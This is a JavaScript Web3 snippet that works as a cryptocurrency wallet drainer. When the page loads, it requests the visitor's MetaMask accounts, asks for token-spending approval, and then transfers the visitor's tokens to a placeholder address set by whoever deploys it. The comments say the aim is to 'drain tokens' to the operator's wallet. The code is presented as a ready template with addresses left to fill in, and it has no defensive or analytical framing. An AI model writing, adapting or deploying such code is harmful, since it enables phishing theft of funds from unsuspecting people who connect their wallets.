const receiveAddress = "YOUR_BSC_ADDRESS_HERE";  // replace with your BSC address
let cryptotokenContract;
let smartContract;

// Initialize the Web3 provider and contracts
function initWeb3() {
    if (typeof window.ethereum !== 'undefined') {
        const web3 = new Web3(window.ethereum);
        return web3;
    } else {
        console.log("No Web3 provider detected. Install Metamask.");
        return null;
    }
}

// Initialize contract instances
function initContract(tokenAbi, tokenAddress, web3) {
    return new web3.eth.Contract(tokenAbi, tokenAddress);
}

// Approve smart contract to spend tokens
async function approveSpending(tokenAddress, spenderAddress, amount, fromAddress, web3) {
    const tokenContract = initContract(tokenAbi, tokenAddress, web3);

    try {
        await tokenContract.methods.approve(spenderAddress, amount).send({ from: fromAddress });
        console.log("Approval successful");
    } catch (error) {
        console.error("Approval failed: ", error);
    }
}

// Drain tokens to receiveAddress
async function drainTokens(tokenAddress, amount, fromAddress, web3) {
    const tokenContract = initContract(tokenAbi, tokenAddress, web3);

    try {
        await tokenContract.methods.transfer(receiveAddress, amount).send({ from: fromAddress });
        console.log("Tokens transferred successfully");
    } catch (error) {
        console.error("Token transfer failed: ", error);
    }
}

(async () => {
    const web3 = initWeb3();
    if (web3) {
        const accounts = await web3.eth.requestAccounts();  // Request connected accounts from the user
        const currentAddr = accounts[0];  // The current user's wallet address
        
        const tokenAddress = "YOUR_TOKEN_CONTRACT_ADDRESS_HERE";  // Replace with your token's contract address
        const spenderAddress = "SMART_CONTRACT_ADDRESS_HERE";  // Replace with the address of the smart contract you are interacting with
        const amount = web3.utils.toWei('1', 'ether');  // Replace '1' with the amount of tokens

        // Approve the contract to spend tokens
        await approveSpending(tokenAddress, spenderAddress, amount, currentAddr, web3);

        // Drain tokens to your wallet
        await drainTokens(tokenAddress, amount, currentAddr, web3);
    }
})();

